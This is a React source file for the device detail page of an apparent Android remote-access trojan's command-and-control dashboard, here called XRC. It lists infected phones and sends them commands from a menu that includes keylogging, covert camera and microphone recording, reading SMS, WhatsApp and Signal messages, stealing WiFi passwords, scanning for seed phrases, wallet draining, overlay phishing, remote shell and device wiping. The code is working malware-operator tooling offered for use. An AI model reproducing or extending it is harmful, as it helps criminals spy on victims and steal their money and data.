// ============================================================
// FILE: XRC/dashboard/src/pages/DeviceDetailPage.tsx
// ============================================================
import { useEffect, useState } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { useDeviceStore } from '@/stores/deviceStore'
import { useCommandStore } from '@/stores/commandStore'
import api from '@/lib/api'
import {
  ArrowLeft, Smartphone, Battery, Wifi, Globe, Monitor, Clock,
  Send, AlertTriangle, Trash2, Edit3, RefreshCw, Shield, MapPin
} from 'lucide-react'
import toast from 'react-hot-toast'
import { motion } from 'framer-motion'
import DataTable from '@/components/DataTable'

export default function DeviceDetailPage() {
  const { deviceId } = useParams<{ deviceId: string }>()
  const navigate = useNavigate()
  const { selectedDevice, fetchDevice, updateDevice, deleteDevice } = useDeviceStore()
  const { commands, fetchCommands, sendCommand } = useCommandStore()
  const [loading, setLoading] = useState(true)
  const [cmdAction, setCmdAction] = useState('')
  const [cmdPayload, setCmdPayload] = useState('')
  const [cmdPriority, setCmdPriority] = useState<'low' | 'normal' | 'high' | 'critical'>('normal')
  const [showEditAlias, setShowEditAlias] = useState(false)
  const [alias, setAlias] = useState('')

  useEffect(() => {
    if (deviceId) {
      Promise.all([
        fetchDevice(deviceId),
        fetchCommands(deviceId, 50),
      ]).finally(() => setLoading(false))
    }
  }, [deviceId])

  const handleSendCommand = async () => {
    if (!cmdAction || !deviceId) return
    try {
      await sendCommand(deviceId, cmdAction, cmdPayload || undefined, cmdPriority)
      toast.success(`Command ${cmdAction} dispatched`)
      setCmdPayload('')
    } catch {
      toast.error('Failed to send command')
    }
  }

  const handleUpdateAlias = async () => {
    if (!deviceId || !alias) return
    await updateDevice(deviceId, { alias })
    setShowEditAlias(false)
    toast.success('Alias updated')
  }

  const handleDelete = async () => {
    if (!deviceId) return
    if (window.confirm('Remove this device from C2?')) {
      await deleteDevice(deviceId)
      navigate('/devices')
      toast.success('Device removed')
    }
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin w-8 h-8 border-2 border-xrc-cyan border-t-transparent rounded-full" />
      </div>
    )
  }

  if (!selectedDevice) {
    return (
      <div className="text-center py-12 text-xrc-text-muted">
        <Smartphone className="w-16 h-16 mx-auto mb-4 opacity-30" />
        <p>Device not found</p>
        <button onClick={() => navigate('/devices')} className="btn-outline mt-4">Back to Devices</button>
      </div>
    )
  }

  const d = selectedDevice

  const quickActions = [
    { action: 'ping', label: 'Ping', icon: RefreshCw },
    { action: 'screenshot', label: 'Screenshot', icon: Monitor },
    { action: 'location', label: 'Location', icon: MapPin },
    { action: 'contacts', label: 'Contacts', icon: Smartphone },
    { action: 'sms_inbox', label: 'SMS Inbox', icon: Smartphone },
    { action: 'app_list', label: 'App List', icon: Smartphone },
  ]

  const commandColumns = [
    { key: 'action', label: 'Action', sortable: true },
    { key: 'status', label: 'Status', sortable: true,
      render: (c: any) => (
        <span className={`px-2 py-0.5 text-xs rounded-full ${
          c.status === 'completed' ? 'bg-xrc-mint/10 text-xrc-mint' :
          c.status === 'failed' ? 'bg-xrc-crimson/10 text-xrc-crimson' :
          c.status === 'executing' || c.status === 'sent' ? 'bg-xrc-cyan/10 text-xrc-cyan' :
          'bg-xrc-orange/10 text-xrc-orange'
        }`}>{c.status}</span>
      )
    },
    { key: 'priority', label: 'Priority', sortable: true },
    { key: 'created_at', label: 'Sent', sortable: true,
      render: (c: any) => new Date(c.created_at * 1000).toLocaleString()
    },
    { key: 'result', label: 'Result',
      render: (c: any) => c.result ? String(c.result).slice(0, 60) : '-'
    },
  ]

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-6">
      {/* Back button */}
      <button
        onClick={() => navigate('/devices')}
        className="flex items-center gap-2 text-xrc-text-muted hover:text-xrc-text text-sm transition-colors"
      >
        <ArrowLeft className="w-4 h-4" />
        Back to Devices
      </button>

      {/* Device header */}
      <div className="glass-card p-6">
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-4">
            <div className="w-16 h-16 rounded-xl bg-gradient-to-br from-xrc-cyan/20 to-xrc-crimson/20 border border-xrc-border flex items-center justify-center">
              <Smartphone className="w-8 h-8 text-xrc-cyan" />
            </div>
            <div>
              <div className="flex items-center gap-3">
                <h1 className="text-xl font-bold text-white mono">{d.alias || d.device_id.slice(0, 16)}</h1>
                <div className={`px-2.5 py-0.5 text-xs rounded-full font-medium ${
                  d.is_online ? 'bg-xrc-mint/10 text-xrc-mint' : 'bg-xrc-text-muted/10 text-xrc-text-muted'
                }`}>
                  {d.is_online ? 'ONLINE' : 'OFFLINE'}
                </div>
                <button onClick={() => { setAlias(d.alias || ''); setShowEditAlias(true) }} className="text-xrc-text-muted hover:text-xrc-cyan">
                  <Edit3 className="w-4 h-4" />
                </button>
              </div>
              <p className="text-xrc-text-muted text-sm mt-1">{d.model} · {d.manufacturer}</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={() => { fetchDevice(deviceId!); fetchCommands(deviceId!) }} className="btn-outline flex items-center gap-2">
              <RefreshCw className="w-4 h-4" /> Refresh
            </button>
            <button onClick={handleDelete} className="btn-crimson flex items-center gap-2">
              <Trash2 className="w-4 h-4" /> Remove
            </button>
          </div>
        </div>

        {/* Edit alias modal */}
        {showEditAlias && (
          <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center" onClick={() => setShowEditAlias(false)}>
            <div className="glass-card p-6 w-80" onClick={(e) => e.stopPropagation()}>
              <h3 className="text-white font-semibold mb-4">Edit Alias</h3>
              <input
                type="text"
                value={alias}
                onChange={(e) => setAlias(e.target.value)}
                className="input-field w-full mb-4"
                placeholder="Enter alias..."
                autoFocus
              />
              <div className="flex gap-2 justify-end">
                <button onClick={() => setShowEditAlias(false)} className="btn-outline">Cancel</button>
                <button onClick={handleUpdateAlias} className="btn-cyan">Save</button>
              </div>
            </div>
          </div>
        )}

        {/* Device details grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6">
          <div className="flex items-center gap-3 p-3 rounded-lg bg-xrc-dark/50">
            <Monitor className="w-5 h-5 text-xrc-cyan" />
            <div>
              <p className="text-xs text-xrc-text-muted">Android Version</p>
              <p className="text-sm text-white font-medium">Android {d.android_version} (SDK {d.sdk_version})</p>
            </div>
          </div>
          <div className="flex items-center gap-3 p-3 rounded-lg bg-xrc-dark/50">
            <Battery className="w-5 h-5 text-xrc-mint" />
            <div>
              <p className="text-xs text-xrc-text-muted">Battery</p>
              <p className="text-sm text-white font-medium">{d.battery_level}%</p>
            </div>
          </div>
          <div className="flex items-center gap-3 p-3 rounded-lg bg-xrc-dark/50">
            <Wifi className="w-5 h-5 text-xrc-cyan" />
            <div>
              <p className="text-xs text-xrc-text-muted">Network</p>
              <p className="text-sm text-white font-medium">{d.network_type || 'N/A'} · {d.ip_address || '-'}</p>
            </div>
          </div>
          <div className="flex items-center gap-3 p-3 rounded-lg bg-xrc-dark/50">
            <Globe className="w-5 h-5 text-xrc-orange" />
            <div>
              <p className="text-xs text-xrc-text-muted">Location</p>
              <p className="text-sm text-white font-medium">{d.country || 'Unknown'}</p>
            </div>
          </div>
        </div>

        {/* Timestamps */}
        <div className="flex items-center gap-6 mt-4 text-xs text-xrc-text-muted">
          <div className="flex items-center gap-1.5">
            <Clock className="w-3.5 h-3.5" />
            First seen: {new Date(d.first_seen * 1000).toLocaleString()}
          </div>
          <div className="flex items-center gap-1.5">
            <Clock className="w-3.5 h-3.5" />
            Last seen: {new Date(d.last_seen * 1000).toLocaleString()}
          </div>
          {d.group_name && (
            <div className="flex items-center gap-1.5">
              <Shield className="w-3.5 h-3.5" />
              Group: {d.group_name}
            </div>
          )}
        </div>
      </div>

      {/* Quick actions */}
      <div className="glass-card p-5">
        <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <Send className="w-4 h-4 text-xrc-cyan" />
          Quick Actions
        </h3>
        <div className="flex flex-wrap gap-2">
          {quickActions.map((qa) => (
            <button
              key={qa.action}
              onClick={async () => {
                try {
                  await sendCommand(deviceId!, qa.action, undefined, 'high')
                  toast.success(`${qa.label} command sent`)
                } catch { toast.error('Failed to send command') }
              }}
              className="flex items-center gap-2 px-4 py-2 rounded-lg border border-xrc-border hover:bg-xrc-dark/50 hover:border-xrc-cyan/30 text-xrc-text transition-all"
            >
              <qa.icon className="w-4 h-4 text-xrc-cyan" />
              {qa.label}
            </button>
          ))}
        </div>
      </div>

      {/* Send custom command */}
      <div className="glass-card p-5">
        <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <Send className="w-4 h-4 text-xrc-cyan" />
          Custom Command
        </h3>
        <div className="flex flex-col sm:flex-row gap-3">
          <select
            value={cmdAction}
            onChange={(e) => setCmdAction(e.target.value)}
            className="input-field"
          >
            <option value="">Select action...</option>
            <option value="ping">Ping</option>
            <option value="screenshot">Screenshot</option>
            <option value="screen_stream">Screen Stream (VNC)</option>
            <option value="location">Location</option>
            <option value="contacts">Contacts</option>
            <option value="sms_inbox">SMS Inbox</option>
            <option value="sms_send">Send SMS</option>
            <option value="call_logs">Call Logs</option>
            <option value="app_list">App List</option>
            <option value="files_list">File List</option>
            <option value="file_upload">Upload File</option>
            <option value="file_download">Download File</option>
            <option value="mic_record">Mic Record</option>
            <option value="camera_photo">Camera Photo</option>
            <option value="camera_video">Camera Video (front)</option>
            <option value="camera_video_back">Camera Video (back)</option>
            <option value="clipboard">Clipboard</option>
            <option value="notifications">Notifications</option>
            <option value="accounts">Accounts</option>
            <option value="calendar">Calendar</option>
            <option value="whatsapp">WhatsApp Messages</option>
            <option value="telegram">Telegram Messages</option>
            <option value="signal">Signal Messages</option>
            <option value="keylog_start">Keylog Start</option>
            <option value="keylog_stop">Keylog Stop</option>
            <option value="keylog_dump">Keylog Dump</option>
            <option value="vpn_check">VPN Check</option>
            <option value="root_check">Root Check</option>
            <option value="proxy_set">Set Proxy</option>
            <option value="lock_device">Lock Device</option>
            <option value="wipe_device">Wipe Device</option>
            <option value="ring_alarm">Ring Alarm</option>
            <option value="toast">Show Toast</option>
            <option value="notification_bar">Push Notification</option>
            <option value="open_url">Open URL</option>
            <option value="open_app">Open App</option>
            <option value="uninstall_self">Uninstall Self</option>
            <option value="apk_download">Download APK</option>
            <option value="apk_install">Install APK</option>
            <option value="shell">Shell Command</option>
            <option value="wifi_scan">WiFi Scan</option>
            <option value="bluetooth_scan">Bluetooth Scan</option>
            <option value="nfc_read">NFC Read</option>
            <option value="sensor_dump">Sensor Dump</option>
            <option value="device_info">Device Info</option>
            <option value="installed_apps">Installed Apps</option>
            <option value="running_services">Running Services</option>
            <option value="process_list">Process List</option>
            <option value="browser_history">Browser History</option>
            <option value="browser_bookmarks">Browser Bookmarks</option>
            <option value="wifi_passwords">WiFi Passwords</option>
            <option value="accounts_db">Accounts DB</option>
            <option value="seed_phrase">Seed Phrase Scan</option>
            <option value="wallet_scan">Wallet Scan</option>
            <option value="finance_scan">Finance Scan</option>
            <option value="drain_start">Wallet Drain Start</option>
            <option value="drain_stop">Wallet Drain Stop</option>
            <option value="drain_status">Wallet Drain Status</option>
            <option value="overlay_phishing">Overlay Phishing</option>
            <option value="vnc_start">VNC Start</option>
            <option value="vnc_stop">VNC Stop</option>
            <option value="self_destruct">Self Destruct</option>
          </select>
          <input
            type="text"
            value={cmdPayload}
            onChange={(e) => setCmdPayload(e.target.value)}
            className="input-field flex-1"
            placeholder="Payload (JSON or text, optional)"
          />
          <select
            value={cmdPriority}
            onChange={(e) => setCmdPriority(e.target.value as any)}
            className="input-field w-28"
          >
            <option value="low">Low</option>
            <option value="normal">Normal</option>
            <option value="high">High</option>
            <option value="critical">Critical</option>
          </select>
          <button onClick={handleSendCommand} className="btn-cyan flex items-center gap-2" disabled={!cmdAction}>
            <Send className="w-4 h-4" /> Send
          </button>
        </div>
      </div>

      {/* Command history */}
      <div className="glass-card p-5">
        <h3 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
          <Clock className="w-4 h-4 text-xrc-cyan" />
          Command History
        </h3>
        <DataTable
          columns={commandColumns}
          data={commands}
          searchable
          searchKeys={['action', 'status', 'result']}
          pageSize={10}
          emptyMessage="No commands sent to this device yet"
        />
      </div>
    </motion.div>
  )
}
